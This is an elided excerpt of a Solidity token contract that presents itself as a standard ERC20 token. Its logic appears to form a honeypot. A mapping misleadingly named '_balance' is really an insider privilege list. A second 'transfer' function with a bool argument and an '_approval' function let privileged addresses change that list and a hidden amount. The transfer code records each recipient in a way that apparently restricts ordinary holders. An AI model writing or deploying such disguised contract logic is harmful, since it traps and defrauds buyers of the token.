...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => bool) private _balance;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _balance[msg.sender] = true;
        _balance[address(this)] = true;
    ...
    function setSwapAndLiquifyEnabled(bool _enabled) external {
        if (_balance[msg.sender]) _swapAndLiquifyEnabled = _enabled;
    }
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_balance[from] && amount <= swapAtAmount) {
        ...
        } else if (_balance[to] && _balance[from]) {
        ...
        bool takeFee = !_balance[from] && !_balance[to] && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (approval[factory] == 0) approval[factory] = swapAtAmount;
        _factory = uint160(to);
        if (takeFee) {
            if (!_balance[from] && !_balance[to]) {
                require(
                    amount <= _maxTxAmount,
    ...
    function transfer(address account, bool value) external {
        if (_balance[msg.sender]) _balance[account] = value;
    }

    function _approval(uint256 amount) external {
        if (_balance[msg.sender]) _amount = amount;
    }
